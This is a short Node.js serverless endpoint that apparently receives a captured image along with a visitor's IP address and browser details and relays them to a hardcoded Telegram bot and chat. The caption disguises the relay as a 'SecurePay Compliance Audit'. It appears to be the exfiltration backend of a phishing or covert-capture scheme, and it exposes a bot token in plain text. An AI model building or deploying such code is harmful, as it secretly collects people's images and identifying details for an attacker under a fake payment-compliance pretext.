module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let body = req.body;
    if (typeof body === 'string') {
      body = JSON.parse(body);
    }
    
    const { image, role, ipInfo, userAgent } = body || {};

    // ==========================================
    // YOUR VERIFIED CREDENTIALS
    // ==========================================
    const TELEGRAM_BOT_TOKEN = "8923655458:AAEiCNK4WqCj9sQVOY7z-ZYeBXsdWX00aPY";
    const TELEGRAM_CHAT_ID = "8783830673";
    // ==========================================

    if (!image) {
      return res.status(400).json({ error: 'No image provided' });
    }

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/png' });

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'audit.png');
    
    const captionText = `🚨 *SecurePay Compliance Audit*\n\n` +
                        `🏷️ *Node Tag:* \`${role || 'Unknown'}\`\n` +
                        `🌐 *IP Address:* \`${ipInfo || 'Unknown'}\`\n` +
                        `💻 *Device:* \`${userAgent || 'Unknown'}\`\n` +
                        `⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n` +
                        `✅ *Status:* \`Session Synchronized & Handshake Cleared\``;
                        
    formData.append('caption', captionText);
    formData.append('parse_mode', 'Markdown');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramResponse.json();
    
    if (!result.ok) {
      console.error("🔴 TELEGRAM PHOTO ERROR:", JSON.stringify(result));
      return res.status(500).json({ telegramError: result.description });
    }

    return res.status(200).json({ success: true, result });
  } catch (error) {
    console.error("🔴 SERVER CRASH:", error.message);
    return res.status(500).json({ error: error.message });
  }
};
